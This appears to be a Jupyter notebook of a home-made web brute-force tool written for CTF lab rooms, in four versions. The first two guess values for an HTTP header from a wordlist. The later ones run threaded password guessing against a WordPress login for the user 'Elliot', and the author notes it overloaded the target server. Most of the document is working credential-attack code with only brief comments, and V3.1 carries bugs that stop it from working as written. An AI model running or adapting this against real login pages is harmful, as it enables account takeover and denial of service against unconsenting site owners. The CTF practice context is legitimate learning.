#!/usr/bin/env python
# coding: utf-8

# # Web Brute Force Program
# 
# I wrote this program originally for the "agent sudo" room, albeit a bit misguidedly. 
# It was then extended for the Mr Robot room when Hydra was taking forever to reach the password.
# 
# 
# ## V1.0 
# This was made to brute force the header in the Agent Sudo room. it uses a static fule but reads in a wordlist and URL

# In[ ]:


# A Bruteforce software for html headers (because burp is too slow)
# Part of The-Cyber-Toolkit
# V1.0

# Planned features
# Provide URL, and example page in .txt format (with replacement character on each side)
# Provide wordlist, one per line
# Import the headers, replacing with special char


# Simple Example, defined page and replace location

import requests

wordlist = open(input("Where is your wordlist?: ") or "/usr/share/wordlists/seclists/Usernames/Names/names.txt")
target = input("What is the target URL?: ")
responses_to_ignore = [200]

print("\nWordlist:", wordlist)
print("TargetURL:", target)

loopcount = 0
for word in wordlist:
    word = word[:-1] # drop the /n at the end
    loopcount += 1
    head_params = {
    "Host" : "127.0.0.1",
    "User-Agent" : str(word),
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language" : "en-US",
    "Accept-Encoding" : "gzip, deflate",
    "Connection" : "Close",
    "Upgrade-Insecure-Requests" : "1",

    }
    r = requests.get(target, headers=head_params)
    if r.status_code in responses_to_ignore:
        print(loopcount, ":", word)
    else:
        print("found in:", loopcount)
        print("ResponseCode:", r.status_code)
        print("Word from Wordlist:", word)
print("END")



# <hr>
# 
# ## V2.0
# The first implimenation to brute force with threads. It just throws many threads at it. Fast but not reliable

# In[ ]:


# A Bruteforce software for html headers (because burp is too slow)
# Part of The-Cyber-Toolkit
# V2.0

# Implimented Features
# Provide URL and wordlist
# Use pre-defined header to bruteforce
# Simple reporting on what is found 

# Planned features
# Provide URL, and example page in .txt format (with replacement character on each side)
# Import the headers, replacing with special char


# Threading the simple request

import requests
import threading
import time

def request_thread(name, word):
    head_params = {
    "Host" : "127.0.0.1",
    "User-Agent" : str(word),
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language" : "en-US",
    "Accept-Encoding" : "gzip, deflate",
    "Connection" : "Close",
    "Upgrade-Insecure-Requests" : "1",

    }
    r = requests.get(target, headers=head_params)

    if r.status_code in responses_to_ignore:
        print_lock.acquire()
        print(name, ":", word)
        print_lock.release()
    else:
        responses_lock.acquire()
        interesting_responses.append([word],r.status_code)
        responses_lock.release()
        print_lock.acquire()
        print("--------------")
        print("found in:", name)
        print("ResponseCode:", r.status_code)
        print("Word from Wordlist:", word)
        print("--------------")
        print_lock.release()


wordlist = open(input("Where is your wordlist?: ") or "/usr/share/wordlists/seclists/Usernames/Names/names.txt")
target = input("What is the target URL?: ")
responses_to_ignore = [200]

print("\nWordlist:", wordlist)
print("TargetURL:", target)

threads = list()
interesting_responses = list()
responses_lock = threading.Lock() # the lock for updating the "interesting Responses" list
print_lock = threading.Lock() # the lock for printing to the terminal

loopcount = 0
for word in wordlist:
    word = word[:-1] # drop the /n at the end
    loopcount += 1
    thr = threading.Thread(target=request_thread, args=(loopcount,word), daemon=True)
    thr.start()
    threads.append(thr)
    time.sleep(0.1) ## Thread max isnt limited, so limted to 10/sec

print("Interesting Resonses:")
print(interesting_responses)

print("END")


# <hr>
# 
# ## V3.0
# This is the first version that is getting more advanced. Used for the Mr Robot room trying to brute force the password (once we have a known user)
# 
# Features
# - Arguements can be passed through the command line (template file isnt implimented)
# - Threading implimented but not managed
# - Response is searched for a static message, if NOT found then it is added to 'interesting responses' and the program finishes.
# 
# To Impliment
# - Manage the threading responses and ensure old connections are closed. Its bringing down the target server with too many open files?
# - Add the search string as an arguement
# - Impliment the template
# - Add the parser for arguements so they dont need to be statically located.

# In[ ]:


# A Bruteforce software for html headers (because burp is too slow)
# Part of The-Cyber-Toolkit
# V3.0
# HTTP Post with response search

# Implimented Features
# Provide URL and wordlist

# Simple reporting on what is found 

# Planned features
# Use template file to bruteforce
# Threading the simple request

## Call with WebHeaderBruteForce [target] [wordlist] [templatefile]

import requests
import threading
import time
import sys

target = sys.argv[1]
words= sys.argv[2]
#template = sys.argv[2]
template = "none"

print("Target:",target)
print("Wordlist:",words)
print("Template:",template)

foundone = False

def request_thread(name, word):
    responses_to_ignore = [200]
    head_params = {
        "Host": "10.10.158.212",
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Content-Type" : "application/x-www-form-urlencoded",
        "Origin" : "http://10.10.158.212",
        "Connection" : "close",
        "Referer" : "http://10.10.158.212/wp-login.php",
        "Cookie" : "wordpress_test_cookie=WP+Cookie+check",
        "Upgrade-Insecure-Requests" : "1"
    }

    content = {
        "log" : "Elliot", 
        "pwd" : word,
        "wp-submit" : "Log In"
    }
    #"log=theuser&pwd=thepassword&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.212%2Fwp-admin%2F&testcookie=1"

    r = requests.post(target, data=content)
    if r.text.find("you entered for the username") < 0:
        global foundone
        foundone = True
        responses_lock.acquire()
        interesting_responses.append(word)
        responses_lock.release()
        print_lock.acquire()
        print("--------------")
        print("found in:", name)
        print("Word from Wordlist:", word)
        print("--------------")
        print_lock.release()
    else:
        print("Nothing for", word, "in thread", name)


threads = list()
interesting_responses = list()
responses_lock = threading.Lock() # the lock for updating the "interesting Responses" list
print_lock = threading.Lock() # the lock for printing to the terminal

wordlist = open(words)

loopcount = 0
for word in wordlist:
    word = word[:-1] # drop the /n at the end
    loopcount += 1
    thr = threading.Thread(target=request_thread, args=(loopcount,word), daemon=True)
    thr.start()
    threads.append(thr)
    time.sleep(0.1) ## Thread max isnt limited, so limted to 10/sec
    if foundone:
        break

print("Interesting Resonses:")
print(interesting_responses)

print("END")


# <hr>
# 
# ### V3.1 WIP
# 
# - Added max thread value
# - Added hardcoded checkpoint

# In[ ]:


# A Bruteforce software for html headers (because burp is too slow)
# Part of The-Cyber-Toolkit
# V3.0
# HTTP Post with response search

# Implimented Features
# Provide URL and wordlist

# Simple reporting on what is found 

# Planned features
# Use template file to bruteforce
# Threading the simple request

## Call with WebHeaderBruteForce [target] [wordlist] [templatefile]

import requests
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor

target = sys.argv[1]
words= sys.argv[2]
#template = sys.argv[2]
template = "none"

print("Target:",target)
print("Wordlist:",words)
print("Template:",template)

foundone = False

def request_thread(name, word):
    responses_to_ignore = [200]
    head_params = {
        "Host": "10.10.158.212",
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Content-Type" : "application/x-www-form-urlencoded",
        "Origin" : "http://10.10.158.212",
        "Connection" : "close",
        "Referer" : "http://10.10.158.212/wp-login.php",
        "Cookie" : "wordpress_test_cookie=WP+Cookie+check",
        "Upgrade-Insecure-Requests" : "1"
    }

    content = {
        "log" : "Elliot", 
        "pwd" : word,
        "wp-submit" : "Log In"
    }
    #"log=theuser&pwd=thepassword&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.212%2Fwp-admin%2F&testcookie=1"

    r = requests.post(target, data=content)
    if r.text.find("you entered for the username") < 0:
        foundone = True
        responses_lock.acquire()
        interesting_responses.append(word)
        responses_lock.release()
        print_lock.acquire()
        print("--------------")
        print("found in:", name)
        print("Word from Wordlist:", word)
        print("--------------")
        print_lock.release()
    else:
        print("Nothing for", word, "in thread", name)


interesting_responses = list()
responses_lock = threading.Lock() # the lock for updating the "interesting Responses" list
print_lock = threading.Lock() # the lock for printing to the terminal

wordlist = open(words)

loopcount = 0
checkpoint = 30000
print("There are", len(list(wordlist)), "entries to processs")

with ThreadPoolExecutor(100) as executor:
    
    for word in wordlist:
        word = word[:-1] # drop the /n at the end
        loopcount += 1
        if loopcount < checkpoint:
            continue
        if loopcount == checkpoint:
            print_lock.acquire()
            print("Starting from", checkpoint)
            print_lock.release()
        executor.submit(request_thread, loopcount, word)
        if foundone:
            break

print("Interesting Resonses:")
print(interesting_responses)

print("END")


# In[ ]:




